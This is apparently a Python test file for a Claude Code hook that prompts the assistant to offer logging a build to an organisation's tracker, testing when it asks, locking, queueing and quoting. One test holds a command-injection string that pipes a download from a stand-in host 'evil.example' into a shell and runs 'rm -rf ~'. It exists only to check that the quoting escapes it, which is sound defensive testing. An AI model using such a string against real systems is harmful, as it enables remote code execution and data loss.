#!/usr/bin/env python3
"""The exploration log's checkpoint asks at the right moment, once, and records
every answer.

Plain stdlib: `python3 hooks/tests/test_logit_checkpoint.py`.

"Log it" was a paragraph asking Claude to notice, mid-task, that a build had
become worth credit. It was offered zero times in the org (0 of 159 tracker rows
at Exploring, 2026-10-11). The checkpoint moves the moment into hooks: they
decide WHEN to ask from the session's work, Claude decides WHETHER it is worth
an offer, and nothing about the answer is silent.

Every subprocess runs sandboxed: its own config dir, no git identity, and a dead
tracker URL, because `offer` and `accept` talk to the tracker and a test that
forgets that writes real rows under the developer's name.
"""
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

HOOKS = Path(__file__).resolve().parents[1]
WINDOWS = os.name == "nt"
failures = []


def check(name, cond, detail=""):
    print(f"  {'ok  ' if cond else 'FAIL'} {name} {'' if cond else detail}")
    if not cond:
        failures.append(name)


def git_bash():
    if not WINDOWS:
        return shutil.which("bash")
    git = shutil.which("git")
    for cand in ([Path(git).resolve().parents[1] / "bin" / "bash.exe"] if git else []) + [
            Path(os.environ.get("ProgramFiles", r"C:\Program Files")) / "Git" / "bin" / "bash.exe"]:
        if cand.is_file():
            return str(cand)
    return None


TMP = Path(tempfile.mkdtemp(prefix="logit-test-"))
HOME = TMP / "home"
(HOME / ".claude").mkdir(parents=True)
GITCFG = TMP / "gitconfig"
GITCFG.write_text("", encoding="utf-8")
ENV = dict(os.environ, HOME=str(HOME), USERPROFILE=str(HOME), CLAUDE_CONFIG_DIR=str(HOME / ".claude"),
           GIT_CONFIG_GLOBAL=str(GITCFG), GIT_CONFIG_NOSYSTEM="1", NSLS_TRACKER_URL="http://127.0.0.1:9",
           PYTHONUTF8="1", PYTHONIOENCODING="utf-8")
STATE = HOME / ".claude" / ".nsls-logit-state.json"
# The in-process checks below import log-it and guardrail_emit, which read these
# at import and at call time: isolate this process as well as its children.
for _k in ("HOME", "USERPROFILE", "CLAUDE_CONFIG_DIR", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_NOSYSTEM", "NSLS_TRACKER_URL"):
    os.environ[_k] = ENV[_k]


def make_repo(name, remote=None):
    repo = TMP / name
    repo.mkdir()
    subprocess.run(["git", "init", "-q", str(repo)], env=ENV, timeout=30)
    if remote:
        subprocess.run(["git", "-C", str(repo), "remote", "add", "origin", remote], env=ENV, timeout=30)
    return repo


def transcript(path, prompts, changes, reads=0, extra=(), mode="w"):
    """A transcript with `prompts` builder messages and `changes` change tools.
    mode="a" appends, as a live session's transcript only ever grows."""
    lines = []
    for i in range(prompts):
        lines.append({"type": "user", "message": {"role": "user", "content": f"step {i}"}})
        if i == 0:
            for _ in range(changes):
                lines.append({"type": "assistant", "message": {"content": [
                    {"type": "tool_use", "name": "Edit", "input": {}}]}})
                lines.append({"type": "user", "message": {"content": [
                    {"type": "tool_result", "content": "ok"}]}})
            for _ in range(reads):
                lines.append({"type": "assistant", "message": {"content": [
                    {"type": "tool_use", "name": "Read", "input": {}}]}})
    lines += list(extra)
    with open(path, mode, encoding="utf-8") as fh:
        fh.write("".join(json.dumps(l) + "\n" for l in lines))


def hook(event, sid, cwd, tpath, **extra):
    payload = {"hook_event_name": event, "session_id": sid, "cwd": str(cwd), "transcript_path": str(tpath)}
    payload.update(extra)
    t0 = time.monotonic()
    r = subprocess.run([sys.executable, str(HOOKS / "logit-checkpoint.py")], input=json.dumps(payload),
                       capture_output=True, text=True, encoding="utf-8", errors="replace", env=ENV,
                       cwd=str(cwd), timeout=60)
    return r, time.monotonic() - t0


def helper(*args, cwd=None):
    return subprocess.run([sys.executable, str(HOOKS / "log-it.py"), *args], capture_output=True, text=True,
                          encoding="utf-8", errors="replace", env=ENV, cwd=str(cwd or TMP), timeout=120)


def state():
    return json.loads(STATE.read_text(encoding="utf-8"))


def key_in(text):
    m = re.search(r"--key-b64 ([A-Za-z0-9_-]+)", text)
    if not m:
        return None
    import base64
    tok = m.group(1)
    return base64.urlsafe_b64decode(tok + "=" * (-len(tok) % 4)).decode("utf-8")


print("quiet until a session has done real work")
repo = make_repo("knowledge-base", "https://github.com/someone/knowledge-base.git")
tp = TMP / "s1.jsonl"
transcript(tp, prompts=2, changes=3)
r, _ = hook("UserPromptSubmit", "s1", repo, tp)
check("2 messages and 3 changes: nothing asked", r.stdout.strip() == "" and r.returncode == 0, repr(r.stdout[:200]))
tpb = TMP / "s1b.jsonl"
transcript(tpb, prompts=5, changes=0, reads=40)
r, _ = hook("UserPromptSubmit", "s1b", repo, tpb)
check("reading and searching is not work: nothing asked", r.stdout.strip() == "", repr(r.stdout[:200]))

print("\nasks once the work is real, where the builder can't see it")
transcript(tp, prompts=1, changes=3, mode="a")   # now 3 messages, 6 changes
r, secs = hook("UserPromptSubmit", "s1", repo, tp)
out = r.stdout
check("6 changes across 3 messages: the question is asked", "exploration log checkpoint" in out, repr(out[:200]))
check("it names this session and this build in its commands",
      '--session "s1"' in out and key_in(out) == "git:github.com/someone/knowledge-base", repr(out[:400]))
check("its commands go through run-hook.sh, never a bare python3",
      'run-hook.sh" logit offer' in out and not re.search(r"(^|\s)python3\s", out))
check("it says answering never holds up the builder's request", "never holds up" in out)
check(f"and it is quick ({secs:.2f}s)", secs < 5)
r, _ = hook("UserPromptSubmit", "s1", repo, tp)
check("asked once: the next message does not ask again", r.stdout.strip() == "", repr(r.stdout[:200]))

print("\nan unanswered question gets one reminder, then is recorded as ignored")
r, _ = hook("Stop", "s1", repo, tp)
try:
    reminder = json.loads(r.stdout)["hookSpecificOutput"]
except Exception:
    reminder = {}
check("the first stop continues Claude with a plain-facts reminder",
      reminder.get("hookEventName") == "Stop" and "still unanswered" in reminder.get("additionalContext", ""),
      repr(r.stdout[:300]))
r, _ = hook("Stop", "s1", repo, tp)
check("the second stop says nothing more", r.stdout.strip() == "", repr(r.stdout[:200]))
check("and records it as ignored", state()["sessions"]["s1"]["answer"] == "ignored")

print("\nan answer in the same turn means no reminder")
repo2 = make_repo("chapter-digest", "git@github.com:thensls/chapter-digest.git")
tp2 = TMP / "s2.jsonl"
transcript(tp2, prompts=3, changes=7)
out = hook("UserPromptSubmit", "s2", repo2, tp2)[0].stdout
key2 = key_in(out)
r = helper("not-yet", "--session", "s2", "--key", key2, "--reason", "a quick one-off fix")
check("`not-yet` records quietly", "Nothing to show the builder" in r.stdout, repr(r.stdout + r.stderr))
check("and the stop is silent", hook("Stop", "s2", repo2, tp2)[0].stdout.strip() == "")
transcript(tp2, prompts=4, changes=60, mode="a")  # a long session keeps going
check("a not-yet is never asked again in the same session, however long it runs",
      hook("UserPromptSubmit", "s2", repo2, tp2)[0].stdout.strip() == "")

print("\n`offer` works with the tracker down, and says nothing about an empty check")
r = helper("offer", "--session", "s2", "--key", key2, "--name", "Chapter digest",
           "--sentence", "Emails chapter presidents a weekly digest of their members' progress", cwd=repo2)
check("it prints an offer for the builder", "Want me to log \"Chapter digest\"" in r.stdout, repr(r.stdout + r.stderr))
check("with the commands for their answer", 'logit accept' in r.stdout and 'logit decline' in r.stdout)
check("and no word about neighbours when none were found",
      "Heads-up" not in r.stdout and "Good news" not in r.stdout and "clear" not in r.stdout.lower())
check("it is recorded as offered", state()["builds"][key2]["names"]["Chapter digest"]["outcome"] == "offered")

print("\na decline sticks: that build is never asked about again")
r = helper("decline", "--session", "s2", "--key", key2, "--name", "Chapter digest", "--note", "just for me")
check("`decline` records it", "won't be offered again" in r.stdout, repr(r.stdout + r.stderr))
tp3 = TMP / "s3.jsonl"
transcript(tp3, prompts=6, changes=20)
check("a later session in the same repo is not asked", hook("UserPromptSubmit", "s3", repo2, tp3)[0].stdout.strip() == "")
r = helper("offer", "--session", "s3", "--key", key2, "--name", "Chapter digest", "--sentence", "x y z")
check("and an explicit offer for it is refused", "isn't offered again" in r.stdout, repr(r.stdout))

print("\n`accept` with the tracker down queues the log instead of losing it")
ENV_EMAIL = dict(ENV, BUILDER_EMAIL="")
(HOME / ".claude" / "local-plugins" / "nsls-personal-toolkit").mkdir(parents=True)
(HOME / ".claude" / "local-plugins" / "nsls-personal-toolkit" / ".env").write_text(
    "BUILDER_EMAIL=test.builder@nsls.org\n", encoding="utf-8")
repo4 = make_repo("ops-dashboard", "https://github.com/thensls/ops-dashboard.git")
key4 = "git:github.com/thensls/ops-dashboard"
r = helper("accept", "--session", "s4", "--key", key4, "--name", "Ops dashboard",
           "--sentence", "Shows the support queue's weekly backlog", cwd=repo4)
check("it says the log is queued", "queued" in r.stdout, repr(r.stdout + r.stderr))
st = state()
check("the queued log is complete, at Exploring, owned by the builder",
      len(st["pending"]) == 1 and st["pending"][0]["payload"]["automation"]["stage"] == "Exploring"
      and st["pending"][0]["payload"]["builder_email"] == "test.builder@nsls.org"
      and st["pending"][0]["payload"]["automation"]["github_repo_url"] == "https://github.com/thensls/ops-dashboard")
check("the build reads as settled, not offered again", st["builds"][key4]["names"]["Ops dashboard"]["outcome"]
      == "logged-pending")
helper("retry-pending")
check("a retry that still can't reach the tracker keeps it queued", len(state()["pending"]) == 1)

print("\na plain folder can hold several builds, so it is never settled wholesale")
folder = TMP / "scratch"
folder.mkdir()
tp5 = TMP / "s5.jsonl"
transcript(tp5, prompts=3, changes=6)
out = hook("UserPromptSubmit", "s5", folder, tp5)[0].stdout
key5 = key_in(out)
check("a folder build is keyed by the folder", (key5 or "").startswith("dir:"), repr(key5))
helper("decline", "--session", "s5", "--key", key5, "--name", "Invoice tidy-up", "--note", "personal")
tp6 = TMP / "s6.jsonl"
transcript(tp6, prompts=3, changes=6)
out = hook("UserPromptSubmit", "s6", folder, tp6)[0].stdout
check("a new session there is still asked, with what is settled listed",
      "Already settled here" in out and "Invoice tidy-up" in out and "declined" in out, repr(out[:400]))
r = helper("settled", "--session", "s6", "--key", key5, "--name", "Invoice tidy-up")
check("and `settled` closes it quietly", "Nothing to show the builder" in r.stdout)

print("\nthree not-yets in a month and it stops asking about that build")
repo7 = make_repo("one-offs", "https://github.com/someone/one-offs.git")
key7 = "git:github.com/someone/one-offs"
for i in range(3):
    helper("not-yet", "--session", f"n{i}", "--key", key7, "--reason", "scratch work")
tp7 = TMP / "s7.jsonl"
transcript(tp7, prompts=5, changes=30)
check("a fourth is never asked", hook("UserPromptSubmit", "s7", repo7, tp7)[0].stdout.strip() == "")

print("\ncoming back to a build counts: the next session is asked early")
repo8 = make_repo("rubric-tool", "https://github.com/someone/rubric-tool.git")
tp8 = TMP / "s8.jsonl"
transcript(tp8, prompts=2, changes=8)            # real work, but only 2 messages: not asked
check("a first session with 2 messages is not asked", hook("UserPromptSubmit", "s8", repo8, tp8)[0].stdout.strip() == "")
tp9 = TMP / "s9.jsonl"
transcript(tp9, prompts=1, changes=1)
check("the next session on it is asked at its first change",
      "exploration log checkpoint" in hook("UserPromptSubmit", "s9", repo8, tp9)[0].stdout)

print("\nconnector writes count as work; connector reads do not")
sys.path.insert(0, str(HOOKS))
import logit_core as core  # noqa: E402
check("a Google Docs update counts", core.is_change("mcp__abc__update_document"))
check("an Airtable create counts", core.is_change("mcp__b9e0__create_records_for_table"))
check("an Airtable list does not", not core.is_change("mcp__b9e0__list_records_for_table"))
check("a search does not", not core.is_change("mcp__x__search_threads"))
check("Read does not", not core.is_change("Read"))

print("\na shorter transcript is a new one: counts restart instead of going stale")
sess = {"offset": 10 ** 9, "changes": 99, "prompts": 99}
transcript(TMP / "short.jsonl", prompts=1, changes=2)
core.scan(sess, TMP / "short.jsonl")
check("offset past the end resets the counts", sess["changes"] == 2 and sess["prompts"] == 1, repr(sess))

print("\na build recorded as settled is never offered, even by name")
helper("settled", "--session", "s11", "--key", "git:github.com/thensls/nsls-builder-toolkit", "--name",
       "NSLS Builder Toolkit")
r = helper("offer", "--session", "s11", "--key", "git:github.com/thensls/nsls-builder-toolkit", "--name",
           "NSLS Builder Toolkit", "--sentence", "The toolkit itself")
check("`offer` refuses it and shows the builder nothing", "isn't offered again" in r.stdout
      and "Want me to log" not in r.stdout, repr(r.stdout))

print("\na huge transcript is read a slice per message, never all at once")
big = TMP / "big.jsonl"
transcript(big, prompts=1, changes=0)
filler = json.dumps({"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Edit", "input":
                     {"pad": "x" * 2000}}]}}) + "\n"
n_edits = (core.SCAN_BUDGET_BYTES * 3) // len(filler) + 1
with open(big, "a", encoding="utf-8") as fh:
    fh.write(filler * n_edits)
sess = {"offset": 0, "changes": 0, "prompts": 0}
core.scan(sess, big)
first = sess["changes"]
check("one call reads no more than its budget", 0 < first < n_edits, f"({first} of {n_edits})")
for _ in range(5):
    core.scan(sess, big)
check("and later calls catch up exactly", sess["changes"] == n_edits, f"({sess['changes']} of {n_edits})")

print("\na corrupt state file is kept for diagnosis, and the hook carries on")
STATE.write_text("{not json", encoding="utf-8")
tp12 = TMP / "s12.jsonl"
transcript(tp12, prompts=1, changes=0)
r, _ = hook("UserPromptSubmit", "s12", repo, tp12)
check("the hook still exits 0", r.returncode == 0)
check("the unreadable file is preserved beside the new one",
      any(f.name.startswith(".nsls-logit-state.json.corrupt-") for f in STATE.parent.iterdir()))
check("and the new state is readable", isinstance(state(), dict))

print("\nwithout flock (Windows), the lock still excludes")
probe = """
import sys, time, threading
sys.modules["fcntl"] = None
sys.path.insert(0, sys.argv[1])
import logit_core as core
core.locked.LOCK_WAIT = 0.4
held = core.locked(); held.__enter__()
t0 = time.monotonic()
try:
    other = core.locked(); other.__enter__(); got = "entered"; other.__exit__(None, None, None)
except core.Busy:
    got = "busy"
waited = time.monotonic() - t0
held.__exit__(None, None, None)
t1 = time.monotonic(); again = core.locked(); again.__enter__(); fast = time.monotonic() - t1
again.__exit__(None, None, None)
print(f"{waited:.2f} {fast:.2f} {got}")
"""
r = subprocess.run([sys.executable, "-c", probe, str(HOOKS)], capture_output=True, text=True, encoding="utf-8",
                   errors="replace", env=ENV, timeout=60)
try:
    waited, fast, got = r.stdout.split()
    waited, fast = float(waited), float(fast)
except Exception:
    waited, fast, got = 0.0, 9.9, ""
check("a second taker waits for the first", waited >= 0.35, f"({r.stdout!r} {r.stderr[-200:]!r})")
check("then gives up without writing, never without the lock", got == "busy", repr(got))
check("and the lock is free again once released", fast < 0.3, f"({fast})")

print("\nnames from the tracker can't run as commands when Claude copies a line")
# A parked idea's name comes from /similar, and anyone can write a tracker row.
evil = 'Idea$(curl -s evil.example | sh)`id`"; rm -rf ~'
quoted = core._q(evil)
check("no $, backtick or stray quote survives", not any(c in quoted[1:-1] for c in '$`"\\'), quoted)
line = core.command("accept", "s", "git:github.com/x/y", "--claim-b64", core.b64e(evil))
check("so the copied command carries it as plain text", "$(" not in line and "`" not in line, line)
check("and the encoded value comes back exactly", core.b64d(core.b64e(evil)) == evil)
import importlib.util  # noqa: E402
spec = importlib.util.spec_from_file_location("log_it", HOOKS / "log-it.py")
log_it = importlib.util.module_from_spec(spec)
spec.loader.exec_module(log_it)
lines, claim = log_it.offer_text("KB", "A knowledge base", [], [
    {"name": evil, "stage": "Idea", "from_idea_backlog": True},
    {"name": "Royce's chapter KB", "stage": "Prototype", "builder": "Royce", "from_idea_backlog": False}])
check("a parked idea becomes the claim, worded as good news", claim == evil and any("Good news" in l for l in lines))
check("a live match is an offer to coordinate, never a wall",
      any("we-might-overlap note" in l and "Your call" in l for l in lines))

print("\nexact names and keys survive the copy, whatever they contain")
odd = TMP / "proj $HOME `x` 'q'"   # all legal in a Windows file name, unlike a double quote
odd.mkdir()
tp13 = TMP / "s13.jsonl"
transcript(tp13, prompts=3, changes=6)
out = hook("UserPromptSubmit", "s13", odd, tp13)[0].stdout
k13 = key_in(out)
check("a folder with shell characters is keyed exactly", k13 == "dir:" + odd.resolve().as_posix(), repr(k13))
token = re.search(r"--key-b64 ([A-Za-z0-9_-]+)", out).group(1)
helper("decline", "--session", "s13", "--key-b64", token, "--name-b64", core.b64e("Budget $ Forecast"),
       "--note", "mine")
names = state()["builds"][k13]["names"]
check("the answer lands on that exact key and name", names.get("Budget $ Forecast", {}).get("outcome") == "declined",
      repr(names))

print("\nan answer from a skill (no session given) resolves the open checkpoint")
repo14 = make_repo("skill-path", "https://github.com/someone/skill-path.git")
tp14 = TMP / "s14.jsonl"
transcript(tp14, prompts=3, changes=6)
out = hook("UserPromptSubmit", "s14", repo14, tp14)[0].stdout
check("the checkpoint asked", "exploration log checkpoint" in out)
helper("not-yet", "--reason", "builder asked something else", cwd=repo14)
check("an answer with no --session closes that session's question",
      state()["sessions"]["s14"]["answer"] == "not-yet", repr(state()["sessions"]["s14"]))
check("so the stop sends no reminder", hook("Stop", "s14", repo14, tp14)[0].stdout.strip() == "")

print("\none record bigger than the read budget is stepped over, not reread forever")
huge = TMP / "huge.jsonl"
transcript(huge, prompts=1, changes=0)
with open(huge, "a", encoding="utf-8") as fh:
    fh.write(json.dumps({"type": "user", "message": {"content": [{"type": "tool_result",
             "content": "z" * (core.SCAN_BUDGET_BYTES + 1000)}]}}) + "\n")
transcript(huge, prompts=0, changes=3, mode="a")
with open(huge, "a", encoding="utf-8") as fh:
    for _ in range(3):
        fh.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Write",
                 "input": {}}]}}) + "\n")
sess = {"offset": 0, "changes": 0, "prompts": 0}
for _ in range(6):
    core.scan(sess, huge)
check("the edits after it are counted", sess["changes"] == 3, repr(sess))

print("\nthe lock never holds up a prompt for long, flock or not")
if not WINDOWS:
    holder = subprocess.Popen([sys.executable, "-c", (
        "import fcntl,sys,time,os; sys.path.insert(0, sys.argv[1]); import logit_core as c; "
        "p=c.state_path().with_suffix('.lock'); p.parent.mkdir(parents=True, exist_ok=True); "
        "f=open(p,'w'); fcntl.flock(f, fcntl.LOCK_EX); print('held', flush=True); time.sleep(8)"), str(HOOKS)],
        stdout=subprocess.PIPE, text=True, encoding="utf-8", errors="replace", env=ENV)
    holder.stdout.readline()
    t0 = time.monotonic()
    r, _ = hook("UserPromptSubmit", "s15", repo, TMP / "s1.jsonl")
    waited = time.monotonic() - t0
    holder.kill()
    check(f"a held flock is given up after the wait ({waited:.1f}s)", waited < 7 and r.returncode == 0)
    check("and the hook neither asks nor writes without the lock",
          r.stdout.strip() == "" and "s15" not in state()["sessions"], repr(r.stdout[:200]))

print("\nqueued logs are kept until the tracker takes them, and reopened if it refuses")
import http.server, threading  # noqa: E401,E402
class Refuse(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.rfile.read(int(self.headers.get("Content-Length") or 0))
        self.send_response(404); self.send_header("Content-Type", "application/json"); self.end_headers()
        self.wfile.write(b'{"error": "No builder found for test.builder@nsls.org"}')
    def log_message(self, *a):
        pass
srv = http.server.HTTPServer(("127.0.0.1", 0), Refuse)
threading.Thread(target=srv.serve_forever, daemon=True).start()
repo16 = make_repo("queue-probe", "https://github.com/thensls/queue-probe.git")
key16 = "git:github.com/thensls/queue-probe"
helper("accept", "--session", "s16", "--key", key16, "--name", "Queue probe", "--sentence", "Probes the queue",
       cwd=repo16)
q0 = state()["pending"]
check("a log the tracker didn't take is queued", len(q0) == 1 and q0[0]["name"] == "Queue probe", repr(q0))
data = state()
data["pending"][0]["created"] = "2000-01-01T00:00:00Z"   # far older than any age limit
STATE.write_text(json.dumps(data), encoding="utf-8")
helper("retry-pending")
check("it is never dropped for age", len(state()["pending"]) == 1)
data = state()
data["pending"][0]["next_try"] = "2000-01-01T00:00:00Z"
STATE.write_text(json.dumps(data), encoding="utf-8")
helper("retry-pending")
q1 = state()["pending"]
check("a retry that can't reach the tracker keeps it, with a later next try",
      len(q1) == 1 and q1[0]["attempts"] >= 2 and q1[0]["next_try"] > core.now_iso(), repr(q1))
data = state()
data["pending"][0]["next_try"] = "2000-01-01T00:00:00Z"
STATE.write_text(json.dumps(data), encoding="utf-8")
ENV_SAVED = ENV["NSLS_TRACKER_URL"]
ENV["NSLS_TRACKER_URL"] = f"http://127.0.0.1:{srv.server_address[1]}"
helper("retry-pending")
ENV["NSLS_TRACKER_URL"] = ENV_SAVED
srv.shutdown()
st = state()
check("a refusal takes it off the queue", st["pending"] == [], repr(st["pending"]))
check("and reopens the build so it can be offered again",
      st["builds"][key16]["names"]["Queue probe"]["outcome"] == "offered", repr(st["builds"][key16]))

print("\na decline that lands while an offer is running is never overwritten")
import argparse, contextlib, io  # noqa: E401,E402
race_key = "git:github.com/someone/race"
def decline_meanwhile(name, sentence):
    with core.locked() as data:
        core.build(data, race_key)["names"][name] = {"outcome": "declined", "at": core.now_iso(), "note": "raced"}
    return []
log_it.installed_neighbours = lambda name, sentence: []
log_it.registry_neighbours = decline_meanwhile
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    log_it.cmd_offer(argparse.Namespace(session="race", key=race_key, name="Race build", sentence="Races"))
check("the decline survives", state()["builds"][race_key]["names"]["Race build"]["outcome"] == "declined")
check("and nothing is offered", "Want me to log" not in buf.getvalue(), buf.getvalue())

print("\nretries take one item at a time, so a lease never outlives its send")
data = state()
data["pending"] = [{"id": f"r{i}", "payload": {"automation": {"name": f"R{i}"}, "builder_email": "x@nsls.org"},
                    "key": race_key, "name": f"R{i}", "created": core.now_iso(), "attempts": 1,
                    "next_try": "2000-01-01T00:00:00Z"} for i in range(3)]
STATE.write_text(json.dumps(data), encoding="utf-8")
leased_at_send = []
def transient(payload):
    leased_at_send.append(sum(1 for q in state()["pending"] if q.get("inflight_until")))
    return False, {"error": "URLError"}
log_it.send_registration = transient
log_it.cmd_retry_pending(None)
check("each send held exactly one lease", leased_at_send == [1, 1, 1], repr(leased_at_send))
q = state()["pending"]
check("all three stay queued for a later try, leases released",
      len(q) == 3 and all(i["attempts"] == 2 and not i.get("inflight_until") for i in q), repr(q))

print("\na no after a queued yes cancels the queued log")
data = state()
data["pending"] = []
STATE.write_text(json.dumps(data), encoding="utf-8")
repo17 = make_repo("changed-mind", "https://github.com/thensls/changed-mind.git")
key17 = "git:github.com/thensls/changed-mind"
helper("accept", "--session", "s17", "--key", key17, "--name", "Changed mind", "--sentence", "Was a yes",
       cwd=repo17)
check("the yes is queued (tracker down)", any(i["name"] == "Changed mind" for i in state()["pending"]))
helper("decline", "--session", "s17", "--key", key17, "--name", "Changed mind", "--note", "actually, no")
check("their no removes it from the queue", not any(i["name"] == "Changed mind" for i in state()["pending"]))
sent = []
log_it.send_registration = lambda payload: (sent.append(payload), (True, {"success": True}))[1]
log_it.cmd_retry_pending(None)
check("so nothing is sent for it", not any(p["automation"]["name"] == "Changed mind" for p in sent), repr(sent))
check("and the no stands", state()["builds"][key17]["names"]["Changed mind"]["outcome"] == "declined")


def accept(key, name, sender):
    log_it.send_registration = sender
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        log_it.cmd_accept(argparse.Namespace(session="s18", key=key, name=name, sentence="Does a thing", claim="",
                                             email="test.builder@nsls.org"))
    return buf.getvalue()


def queue_item(key, name, item_id):
    return {"id": item_id, "payload": {"automation": {"name": name}, "builder_email": "x@nsls.org"}, "key": key,
            "name": name, "created": core.now_iso(), "attempts": 1, "next_try": "2000-01-01T00:00:00Z"}


print("\na stale queued log can't undo a later yes that went through")
key18 = "git:github.com/thensls/second-try"
data = state()
data["pending"] = [queue_item(key18, "Second try", "stale")]
data["builds"][key18] = {"names": {"Second try": {"outcome": "logged-pending", "at": core.now_iso()}},
                         "work_sessions": 0, "not_yet": []}
STATE.write_text(json.dumps(data), encoding="utf-8")
accept(key18, "Second try", lambda payload: (True, {"success": True, "automation": {"record_id": "recNEW"}}))
st = state()
check("the yes that went through replaces the queued copy",
      not any(q["name"] == "Second try" for q in st["pending"])
      and st["builds"][key18]["names"]["Second try"]["outcome"] == "logged", repr(st["pending"]))
st["pending"] = [queue_item(key18, "Second try", "stale2")]
STATE.write_text(json.dumps(st), encoding="utf-8")
log_it.send_registration = lambda payload: (False, {"error": "HTTP 404", "status": 404})
log_it.cmd_retry_pending(None)
st = state()
check("and a refusal of a stale copy leaves the log standing",
      st["builds"][key18]["names"]["Second try"]["outcome"] == "logged" and st["pending"] == [],
      repr(st["builds"][key18]))

print("\na no given while a yes is still sending stands, and the failed yes isn't queued")
key19 = "git:github.com/thensls/withdrawn"


def no_while_sending(ok):
    def sender(payload):
        with core.locked() as d:
            core.build(d, key19)["names"]["Withdrawn"] = {"outcome": "declined", "at": core.now_iso(),
                                                          "note": "changed my mind"}
        return (True, {"success": True}) if ok else (False, {"error": "URLError"})
    return sender


out = accept(key19, "Withdrawn", no_while_sending(ok=False))
st = state()
check("the no stands", st["builds"][key19]["names"]["Withdrawn"]["outcome"] == "declined", repr(st["builds"][key19]))
check("nothing is queued to publish it", not any(q["name"] == "Withdrawn" for q in st["pending"]), repr(st["pending"]))
check("and Claude is told the no stands", "their no stands" in out and "queued and goes out" not in out, out)
out = accept(key19, "Withdrawn", no_while_sending(ok=True))
check("a send that landed as they declined still leaves the no standing",
      state()["builds"][key19]["names"]["Withdrawn"]["outcome"] == "declined" and "Logged" not in out, out)

print("\nan answer that couldn't be saved is never reported as recorded or queued")
real_save = core.save
core.save = lambda d: False
try:
    out = accept("git:github.com/thensls/unsaved", "Unsaved", lambda payload: (False, {"error": "URLError"}))
    check("a failed log isn't called queued", "NOT logged" in out and "queued and goes out" not in out, out)
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        log_it.cmd_decline(argparse.Namespace(session="s19", key=key19, name="Unsaved no", note=""))
    check("a decline that didn't save says to run it again", "Run the same decline again" in buf.getvalue(),
          buf.getvalue())
finally:
    core.save = real_save
check("and nothing was written", "git:github.com/thensls/unsaved" not in state()["builds"])

print("\nwhile another session holds the state, an answer is refused, not half-written")
holder = core.locked()
holder.__enter__()
try:
    r = helper("decline", "--session", "s20", "--key", key19, "--name", "Held", "--note", "no")
finally:
    holder.__exit__(None, None, None)
check("Claude is told to run it again", "Not recorded" in r.stdout, repr(r.stdout + r.stderr[-200:]))
check("and nothing was written", "Held" not in state()["builds"][key19]["names"])

print("\npruning keeps every answered build, dropping activity-only ones first")
saved_caps = core.MAX_BUILDS, core.MAX_ANSWERED_BUILDS
core.MAX_BUILDS, core.MAX_ANSWERED_BUILDS = 5, 3
d = {"sessions": {}, "pending": [], "builds": {}}
for i in range(8):   # activity only, newest last
    d["builds"][f"dir:/a{i}"] = {"names": {}, "touched": f"2026-01-{10 + i:02d}T00:00:00Z"}
for i in range(4):   # answered, and older than all of them
    d["builds"][f"git:x/answered{i}"] = {"touched": f"2025-01-{10 + i:02d}T00:00:00Z", "names": {
        "N": {"outcome": "declined", "at": f"2025-01-{10 + i:02d}T00:00:00Z"}}}
core._prune(d)
core.MAX_BUILDS, core.MAX_ANSWERED_BUILDS = saved_caps
check("activity-only builds are cut to their cap, oldest first",
      sorted(k for k in d["builds"] if k.startswith("dir:")) == [f"dir:/a{i}" for i in range(3, 8)], repr(d["builds"]))
check("answered builds outlive them, cut only past their own cap",
      sorted(k for k in d["builds"] if k.startswith("git:")) == [f"git:x/answered{i}" for i in (1, 2, 3)],
      repr(sorted(d["builds"])))

print("\nonly a remote slug becomes a repo link; a local repo or folder has none")
norem = make_repo("no-remote")
check("a repo without a remote gets a local key", core.build_key(str(norem)).startswith("local:"),
      core.build_key(str(norem)))
check("a remote slug becomes its https link", log_it.repo_url("git:github.com/thensls/x") == "https://github.com/thensls/x")
for k in ("local:C:/work/project", "local:/home/me/project", "dir:C:/Users/me/docs", "git:C:/work/project"):
    check(f"no link for {k}", log_it.repo_url(k) == "")

print("\nthe labels it reports exist in the emitter, and hooks.json registers it")
import guardrail_emit  # noqa: E402
for label in ("guardrail_logit_offered", "guardrail_logit_accepted", "guardrail_logit_declined"):
    check(f"{label} is a known label", label in guardrail_emit.LABELS)
hooks = json.loads((HOOKS / "hooks.json").read_text(encoding="utf-8"))["hooks"]
for event in ("UserPromptSubmit", "Stop"):
    cmds = [h for g in hooks.get(event, []) for h in g["hooks"]]
    check(f"{event} runs the checkpoint once, through bash",
          len(cmds) == 1 and cmds[0]["command"].endswith('run-hook.sh" checkpoint') and cmds[0].get("shell") == "bash",
          repr(cmds))

print("\nthrough the launcher, the way Claude Code and Claude run it")
bash = git_bash()
if not bash:
    check("bash is available", False, "(no Git Bash found)")
else:
    launcher = (HOOKS / "run-hook.sh").as_posix()
    tp10 = TMP / "s10.jsonl"
    transcript(tp10, prompts=3, changes=6)
    repo10 = make_repo("launcher-check", "https://github.com/someone/launcher-check.git")
    payload = json.dumps({"hook_event_name": "UserPromptSubmit", "session_id": "s10", "cwd": str(repo10),
                          "transcript_path": str(tp10)})
    r = subprocess.run([bash, launcher, "checkpoint"], input=payload, capture_output=True, text=True,
                       encoding="utf-8", errors="replace", env=ENV, cwd=str(repo10), timeout=60)
    check("`checkpoint` asks through the launcher", "exploration log checkpoint" in r.stdout, repr(r.stdout[:200] + r.stderr[-200:]))
    r = subprocess.run([bash, launcher, "logit", "not-yet", "--session", "s10", "--key",
                        "git:github.com/someone/launcher-check", "--reason", "has spaces in it"],
                       capture_output=True, text=True, encoding="utf-8", errors="replace", env=ENV,
                       cwd=str(repo10), timeout=60)
    check("`logit` answers through the launcher, quoted argument intact",
          "Recorded" in r.stdout and state()["builds"]["git:github.com/someone/launcher-check"].get(
              "last_not_yet_reason") == "has spaces in it", repr(r.stdout + r.stderr))

shutil.rmtree(TMP, ignore_errors=True)
print()
if failures:
    print(f"FAILED: {len(failures)} check(s): {', '.join(failures)}")
    sys.exit(1)
print("all checks passed")
